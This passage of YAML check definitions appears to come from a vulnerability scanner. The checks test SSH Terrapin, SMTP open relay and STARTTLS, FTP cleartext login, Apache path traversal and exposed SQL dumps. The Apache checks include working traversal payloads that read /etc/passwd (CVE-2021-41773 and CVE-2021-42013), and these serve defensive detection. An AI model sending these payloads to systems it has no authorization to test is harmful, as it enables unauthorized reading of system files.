  # Terrapin (CVE-2023-48795): la versión sólo dice que estaba afectada; el
  # KEXINIT dice si esta configuración lo está. Confirmador y refutador
  # corren sólo si la versión propuso la CVE.
  - id: ssh-terrapin-confirm
    version: 1
    type: script
    script: ssh-terrapin-confirm
    category: vulnerability
    severity: MEDIUM
    service: ssh
    mode: safe
    confirms: CVE-2023-48795
    finding:
      title: 'SSH: vulnerable a Terrapin (CVE-2023-48795), sin strict kex'
      qod: 99
      confirmed: true
  - id: ssh-terrapin-refute
    version: 1
    type: script
    script: ssh-terrapin-refute
    category: vulnerability
    severity: INFO
    service: ssh
    mode: safe
    refutes: CVE-2023-48795
    finding:
      title: 'SSH: no vulnerable a Terrapin (strict kex anunciado o sin modos afectados)'
      qod: 99
      confirmed: false
  # SMTP relay abierto: el servidor acepta un RCPT a un dominio externo desde un
  # remitente externo. No se llega a DATA — no se envía correo, sólo se observa
  # que aceptaría enrutarlo. Un servidor bien configurado responde 550/554.
  - id: smtp-open-relay
    version: 1
    type: network
    category: network_config
    severity: HIGH
    service: smtp
    mode: safe
    expectBanner: true
    requests:
      - send: "EHLO lybra.local\r\n"
        read: block
        matchers:
          - type: word
            part: body
            words:
              - '250'
      - send: "MAIL FROM:<probe@lybra-external.example>\r\n"
        read: block
        matchers:
          - type: word
            part: body
            words:
              - '250'
      - send: "RCPT TO:<relay-test@lybra-nonexistent-external.example>\r\n"
        read: block
        matchers:
          - type: word
            part: body
            words:
              - '250'
    finding:
      title: 'SMTP: relay abierto (acepta enrutar correo de terceros)'
      qod: 99
      confirmed: true
  # SMTP sin STARTTLS: el EHLO no anuncia STARTTLS entre sus capacidades, así
  # que las credenciales de autenticación viajarían en claro.
  - id: smtp-no-starttls
    version: 1
    type: network
    category: network_config
    severity: MEDIUM
    service: smtp
    mode: safe
    expectBanner: true
    requests:
      - send: "EHLO lybra.local\r\n"
        read: block
        matchers-condition: and
        matchers:
          - type: word
            part: body
            words:
              - '250'
          - type: word
            part: body
            words:
              - STARTTLS
            negative: true
    finding:
      title: 'SMTP: sin STARTTLS anunciado (autenticación en claro posible)'
      qod: 99
      confirmed: true
  # FTP sin cifrado: el servidor rechaza AUTH TLS, así que credenciales y datos
  # viajan en claro. Un servidor que soporta FTPS responde 234.
  - id: ftp-no-tls
    version: 1
    type: network
    category: network_config
    severity: MEDIUM
    service: ftp
    mode: safe
    expectBanner: true
    requests:
      - send: "AUTH TLS\r\n"
        read: block
        matchers:
          - type: regex
            part: body
            regex:
              - '^(?:500|502|504|530|534|431)'
    finding:
      title: 'FTP: sin cifrado disponible (AUTH TLS no soportado)'
      qod: 99
      confirmed: true
  # FTP que ofrece TLS sin exigirlo: responde 331 (pide la contraseña) a un
  # USER enviado sin AUTH TLS, así que la aceptaría en claro. Nunca se
  # envía PASS: el 331 ya es la prueba. Un servidor que exige TLS responde
  # 530/550/534. El usuario es inventado para no tocar ninguna cuenta real
  # ni el anónimo (ftp-anonymous-login ya cubre ése).
  - id: ftp-cleartext-login-allowed
    version: 1
    type: network
    category: network_config
    severity: MEDIUM
    service: ftp
    mode: safe
    expectBanner: true
    requests:
      - send: "USER lybra-cleartext-probe\r\n"
        read: block
        matchers:
          - type: regex
            part: body
            regex:
              - '^331'
    finding:
      title: 'FTP: acepta credenciales en claro (TLS ofrecido pero no exigido)'
      qod: 99
      confirmed: true
  # ===================================================================
  # Confirmadores (L29): ascienden una hipótesis por versión de
  # confirmed=false/qod=70 a confirmed=true/qod=99. Sólo corren si el
  # matcher de versiones ya propuso su CVE, y NUNCA explotan — comprueban
  # la condición sin ejecutar nada en el objetivo.
  # ===================================================================
  # CVE-2021-41773: path traversal de Apache 2.4.49. La prueba lee
  # /etc/passwd por la ruta vulnerable — una lectura, no una ejecución. Si
  # el cuerpo trae la línea de root, el fichero se sirvió: confirmado.
  - id: apache-cve-2021-41773-path-traversal
    version: 1
    type: http
    category: vulnerability
    severity: CRITICAL
    service: http
    mode: safe
    confirms: CVE-2021-41773
    requests:
      - method: GET
        path: /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
        matchers-condition: and
        matchers:
          - type: status
            value:
              - 200
          - type: regex
            part: body
            regex:
              - 'root:.*:0:0:'
    finding:
      title: 'Apache path traversal confirmado (CVE-2021-41773): /etc/passwd legible'
      qod: 99
      confirmed: true
  # CVE-2021-42013: el bypass del arreglo incompleto de 41773 en Apache
  # 2.4.50, con doble codificación de los puntos.
  - id: apache-cve-2021-42013-path-traversal
    version: 1
    type: http
    category: vulnerability
    severity: CRITICAL
    service: http
    mode: safe
    confirms: CVE-2021-42013
    requests:
      - method: GET
        path: /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
        matchers-condition: and
        matchers:
          - type: status
            value:
              - 200
          - type: regex
            part: body
            regex:
              - 'root:.*:0:0:'
    finding:
      title: 'Apache path traversal confirmado (CVE-2021-42013): /etc/passwd legible'
      qod: 99
      confirmed: true
  # ---------------------------------------------------------------------------
  # PAYLOADS (L30) — una lista de valores sustituidos en la ruta, en vez de un
  # check por variación. Este busca un volcado de base de datos olvidado bajo
  # la raíz web: los nombres de fichero de copia de seguridad más habituales,
  # probados con una sola entrada de feed. El motor expande ``{{name}}`` una
  # vez por valor y corta en ``maxPayloadExpansions``, así que la lista puede
  # crecer sin volverse un barrido. Cualquiera que devuelva 200 con pinta de
  # volcado SQL dispara; un solo hallazgo, sea cual sea el que picó.
  - id: sql-dump-exposure
    version: 1
    type: http
    category: exposed_path
    severity: HIGH
    service: http
    mode: safe
    payloads:
      name:
        - backup.sql
        - dump.sql
        - database.sql
        - db.sql
        - backup.sql.gz
        - www.sql
        - site.sql
    requests:
      - method: GET
        path: /{{name}}
        matchers-condition: and
        matchers:
          - type: status
            value:
              - 200
          - type: word
            part: body
            words:
              - 'CREATE TABLE'
              - 'INSERT INTO'
              - 'DROP TABLE'
    finding:
      title: Volcado de base de datos SQL expuesto bajo la raíz web
      qod: 99
      confirmed: true
